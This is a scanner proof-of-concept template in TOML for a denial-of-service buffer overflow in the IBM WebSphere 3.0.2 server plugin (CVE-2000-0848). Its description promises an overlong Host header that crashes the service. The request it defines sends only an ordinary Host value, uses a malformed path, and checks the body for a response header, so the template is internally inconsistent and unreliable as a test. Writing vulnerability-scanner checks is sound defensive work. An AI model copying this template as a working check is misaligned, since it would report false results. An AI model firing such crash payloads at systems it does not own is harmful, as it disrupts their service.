[info]
author = "AVE"
description = "通过发送超长 Host 请求头触发 IBM WebSphere Application Server 3.0.2 服务器插件缓冲区溢出，导致服务崩溃"
id = "POC-AVE-2000-0628"
name = "IBM WebSphere Application Server 3.0.2 Server Plugin 缓冲区溢出 PoC"
severity = "critical"
tags = ["cve-2000-0848"]
vuln_id = [
    "CVE-2000-0848",
    "AVE-2000-0628",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Host = "{{BaseURL}}"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "Connection: close",
]
